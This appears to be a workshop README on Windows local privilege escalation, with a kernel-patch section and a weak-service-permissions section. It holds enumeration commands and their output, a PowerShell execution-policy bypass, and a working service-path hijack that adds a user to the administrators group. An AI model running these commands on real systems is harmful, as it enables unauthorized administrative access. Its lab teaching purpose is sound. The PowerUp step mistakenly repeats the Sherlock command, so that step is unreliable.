# Windows Privilege Escalation Techniques

> Subtitle or Short Description Goes Here

> ideally one sentence

> include terms/tags that can be searched


***Linux & Windows local privilege escalation methods tree***

[![Linux & Windows privilege escalation](https://raw.githubusercontent.com/chmodx/WinNixPE-workshop/master/media/lpe-tree.jpeg)]()


## Table of Contents

> If you're `README` has a lot of info, section headers might be nice.

- [Kernel](#kernel)
- [Weak Service Permissions](#weak-service-permissions)
- [Contributing](#contributing)
- [Team](#team)
- [FAQ](#faq)
- [Support](#support)
- [License](#license)


## Kernel

[![Windows architecture](https://raw.githubusercontent.com/chmodx/WinNixPE-workshop/master/media/windows-architecture.png)]()

> As shown in the above diagram, the Windows operating system has two main components: user mode and kernel mode, refer <a href="https://en.wikipedia.org/wiki/Architecture_of_Windows_NT" target="_blank">here</a>.

> **HACK AWAY!** 🔨🔨🔨 

#### **#1 Step | 🔎 Information Gathering**
    
- **#1 Option** 🔪 Get `systeminfo` and use `windows-exploit-suggester` which based upon the hotfix data.

    - Execute `systeminfo` on the target machine then copy and save on the attacker machine.
     - Use [windows-exploit-suggester](#windows-exploit-suggester):
        - First, update the tool then we get file in the `XLS` format.
        - Using this `XLS` file and system information execute the tool and observe potential exploits list.
        
## windows-exploit-suggester
> This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. It requires the 'systeminfo' command output from a Windows host in order to compare that the Microsoft security bulletin database and determine the patch level of the host, refer <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank">here</a>.

```shell
$  ./windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2019-02-28-mssb.xls
[*] done
```

```shell
$ ./windows-exploit-suggester.py --database 2019-02-28-mssb.xls --systeminfo systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 2 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits
[*] there are now 386 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 SP1 64-bit'
[*]
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
....
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
```


- **#2 Option** 🔪 Use PowerShell script <a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" target="_blank">Sherlock</a> to find missing software patches for privilege escalation.

    - 👯 Clone this repo to your local (attacker) machine using `https://github.com/rasta-mouse/Sherlock`
     - Transfer the `Sherlock.ps1` PowerShell script to the target machine. [How transfer file to target machine ?](link)
     -  After, execute the script on the target machine with spesial flag as shown below.
     ```cmd
     powershell.exe -nop -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
     ```

```cmd
C:\Users\user>powershell.exe -nop -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
...

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Appears Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

```

#### **#2 Step | Escalation 🏹**
#####❗️ We can download exploit via <a href="https://www.exploit-db.com/searchsploit" target="_blank">searchploit</a> tool then compile this or use compiled exploit from the <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">here</a>. 
---

## Weak Service Permissions

- Every object that can have an `security descriptor (SD)` is a securable object that may be protected by permissions. A security descriptor contains the security information associated with a securable object.

- `SD` can include the following security information:
    + A `system access control list  (SACL)` that specifies the types of access attempts that generate audit records for the object.
    + A `discretionary access control list (DACL)` that specifies the access rights allowed or denied to particular users or groups. We can see in the below picture permission list (DACLs) for `Windows Explorer`  object.
    
        [![Permissions List](https://raw.githubusercontent.com/chmodx/WinNixPE-workshop/master/media/list_of_permissions.png)]()

    + `Security Descriptor Definition Language (SDDL)` defines the string format that is used to describe a security descriptor as a text string.

        [![SDDL Example](https://raw.githubusercontent.com/chmodx/WinNixPE-workshop/master/media/SDDL-example.png)]()
        The screenshot taken from the repo `https://github.com/sagishahar/lpeworkshop`

> **HACK AWAY!** 🔨🔨🔨

#### **#1 Step | 🔎 Information Gathering**
    
- **#1 Option** 🔪 Use a `PowerUp` PowerShell script which included the <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank">`PowerSploit`</a> Post-Exploitation Framework.

    - Download the script to your local (attacker) machine from `https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1`
     - Transfer the `PowerUp.ps1` PowerShell script to the target machine. [How transfer file to target machine ?](link)
     -  After, execute the script on the target machine with spesial flag as shown below.
     ```cmd
     powershell.exe -nop -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
     ```

- **#2 Option** 🔪 We will be checking a lot of access rights so we should grab a copy of `Accesschk` which is a tool from Microsoft's Sysinternals Suite. You can get additionals information from Microsoft technet <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank">here</a>.

    - Download the file in a zip format to your local (attacker) machine from `https://download.sysinternals.com/files/AccessChk.zip` then extract.
     - Transfer the `accesschk64.exe` executable file to the target machine. [How transfer file to target machine ?](link)
     -  After, execute the script on the target machine with spesial flag as shown below (<font color="red">in our case system's username is a `user`</font>).
     ```cmd
     accesschk64.exe -uwcqv "user" *  -accepteula
     ```
     - Then, we get list of vulnerable services list which we can access.

        [![Accesschk services](https://raw.githubusercontent.com/chmodx/WinNixPE-workshop/master/media/accesschk-result.png)]()

#### **#2 Step | Escalation 🏹**
- After the information gathering phase, we recognize `daclsvc` service as vulnerable. We can access for change path. 
    + Execute the commands on the target machine as shown below.
        * Verify ☑️
            ```cmd
            sc qc daclsvc
            ```
        * Change path to our payload (add user to admin group), then start service 🧨
            ```cmd
            sc config daclsvc binpath= "net localgroup administrators user /add"
            ```
            ```cmd
            sc start daclsvc
            ```

---

---

## FAQ

- [How transfer file to target machine ?](link)

---

## Support

Reach out to me at one of the following places!

- Website at <a href="http://chmodx.com" target="_blank">`chmodx.com`</a>
- Twitter at <a href="https://twitter.com/b4ut4" target="_blank">`@b4ut4`</a>
- Linkedin at <a href="https://www.linkedin.com/in/b4ut4/" target="_blank">`Ali Huseyn Aliyev`</a>

---

## License

[![License](http://img.shields.io/:license-mit-blue.svg?style=flat-square)](http://badges.mit-license.org)

- **[MIT license](http://opensource.org/licenses/mit-license.php)**
- Copyright 2019 © <a href="http://chmodx.com" target="_blank">chmodx</a>.